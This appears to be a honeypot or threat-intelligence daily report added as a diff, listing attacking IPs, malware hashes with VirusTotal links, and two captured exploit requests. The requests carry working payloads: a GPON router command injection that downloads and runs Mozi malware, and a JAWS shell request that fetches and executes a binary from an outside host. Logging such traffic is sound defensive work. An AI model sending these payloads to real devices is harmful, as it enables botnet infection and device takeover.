@@ -1,0 +1,39 @@
+Top 5 IPs for 2024-06-19 :
+
+41.231.46.89
+43.134.118.49
+81.214.222.53
+1.238.106.229
+189.1.86.233
+
+Malware Observed:
+
+
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+
+
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+
+Commands/exploits observed:
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
+
+
+GET /shell?cd+/tmp;+rm+-rf+r;+wget+http:/\\/94.156.71.83/r;+chmod+777+r;+./r+jaws;+rm+-rf+r HTTP/1.1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
